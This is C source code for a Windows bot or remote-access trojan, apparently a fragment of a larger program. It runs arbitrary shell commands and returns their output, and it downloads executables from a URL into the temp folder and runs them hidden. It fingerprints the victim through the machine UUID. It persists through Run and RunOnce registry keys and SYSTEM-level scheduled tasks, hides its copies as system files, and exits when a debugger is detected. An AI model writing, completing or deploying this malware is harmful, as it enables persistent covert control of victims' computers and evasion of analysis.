char *exec_ret(char *cmd, int *sz) {
 char *output = malloc(1000000);
 FILE *fd = _popen(cmd, "rb");
 *sz = fread(output, 1, 999999, fd);
 return output;
}

void encrypt_decrypt(char *buf, int length) {
 int i = 0;
 for(i=0;i<length;i++) {
  buf[i] = buf[i] ^ encryption_key[i % strlen(encryption_key)];
 }
}

void setup_mutex(char *machine_mutex) {
 int mmsz = strlen(machine_mutex)+strlen(bot_name)+8;
 char *machine_mutex_r = malloc(mmsz);
 sprintf(machine_mutex_r, "%s:%s", machine_mutex, bot_name);
 HANDLE hmut = CreateMutex(0, 0, machine_mutex_r);
 free(machine_mutex_r);
 if(GetLastError() == ERROR_ALREADY_EXISTS) {
  #if debug == 1
   printf("Exiting, mutex: %s already exists.\n", machine_mutex_r);
  #endif
  exit(-1);
 }
 #if debug==1
  printf("Created mutex: %s\n", machine_mutex_r);
 #endif
}

char *get_machine_uuid() {
 char *fbuf = malloc(1024);
 memset(fbuf, 0, 1024);
 FILE *fd = _popen("wmic csproduct get UUID", "r");
 fread(fbuf, 1, 1023, fd);
 char *br = malloc(1024);
 memset(br, 0, 1024);
 char *p = strstr(fbuf, "\n");
 if(!p) return "invalid";
 p += 1;
 memcpy(br, p, strlen(p));
 free(fbuf);
 char *nl = strstr(br, " ");
 if(nl) *nl = '\0';
 return br;
}

char *get_rand_filename() {
 srand(GetTickCount());
 char *filename = malloc(12);
 memset(filename, 0, 12);
 int i = 0;
 for(i=0;i<4;i++) filename[i] = rand() % (0x7b - 0x61) + 0x61;
 strcat(filename, ".exe");
 #if debug==1
  printf("Generated random name: %s\n", filename);
 #endif
 return filename;
}

void down_exec(char *url) {
 char *temppath = malloc(1024);
 GetEnvironmentVariable("temp", temppath, 254);
 snprintf(temppath+strlen(temppath), 1024-254, "\\%s", get_rand_filename());
 URLDownloadToFile(0, url, temppath, 0, 0);
 PROCESS_INFORMATION pi = {0};
 STARTUPINFO si = {0};
 CreateProcess(0, temppath, 0, 0, 0, CREATE_NO_WINDOW, 0, 0, &si, &pi);
 #if debug==1
  printf("Created new process on: %s\n", temppath);
 #endif
 free(url);
 free(temppath);
}

void add_runkey_val(char *path, char *keyname) {
 int szpath = strlen(path);
 HKEY hkey = 0;
 RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hkey);
 RegSetValueEx(hkey, keyname, 0, REG_SZ, path, szpath);
 RegCloseKey(hkey);
 hkey = 0;
 RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
 RegSetValueEx(hkey, keyname, 0, REG_SZ, path, szpath);
 RegCloseKey(hkey);
 hkey = 0;
 RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hkey);
 RegSetValueEx(hkey, keyname, 0, REG_SZ, path, szpath);
 RegCloseKey(hkey);
 hkey = 0;
 RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
 RegSetValueEx(hkey, keyname, 0, REG_SZ, path, szpath);
 RegCloseKey(hkey);
 hkey = 0;
}

void add_scheduled_task(char *path, char *keyname) {
 char *fuck = malloc(1024 + strlen(path) + strlen(keyname));
 sprintf(fuck, "schtasks /create /sc minute /mo %d /tn \"%s\" /tr \"cmd.exe /k %s\" /ru system /rl highest", delay, keyname, path);
 _pclose(_popen(fuck, "r"));
 free(fuck);
}

void setup_persistence(char *filename) {
 int i = 0;
 for(i=0;i<sizeof(persistfilenames)/sizeof(persistfilenames[0]);i++) {
  CopyFile(filename, persistfilenames[i], 0);
  SetFileAttributes(persistfilenames[i], FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
  add_runkey_val(persistfilenames[i], keynames[i]);
  add_scheduled_task(persistfilenames[i], keynames[i]);
 }
}

void establish_persistence(char *filename) {
 while(1) {
  setup_persistence(filename);
  sleep(delay);
 }
}

int initialize_winsock() {
 struct WSAData wsadata = {0};
 WSAStartup(MAKEWORD(2,2), &wsadata);
 return 1;
}

int debug_check() {
 if(IsDebuggerPresent()) exit(-1);
 PBOOL isdbg = false;
 HANDLE hproc = OpenProcess(GENERIC_ALL, 0, _getpid());
 if(hproc == 0) return;
 CheckRemoteDebuggerPresent(hproc, isdbg);
 CloseHandle(hproc);
 if(isdbg != 0) exit(-1);
}

void *antidebug() {
 while(1) {
  debug_check();
  sleep(delay);
 }
}

int initialize_antidebug() {
 CreateThread(0, 0, (LPTHREAD_START_ROUTINE)antidebug, 0, 0, 0);
}

void hide_window() {
 HANDLE hwnd = GetConsoleWindow();
 ShowWindow(hwnd, SW_HIDE);
 CloseHandle(hwnd);
}

void delay_execution() {
 sleep(delay);
}
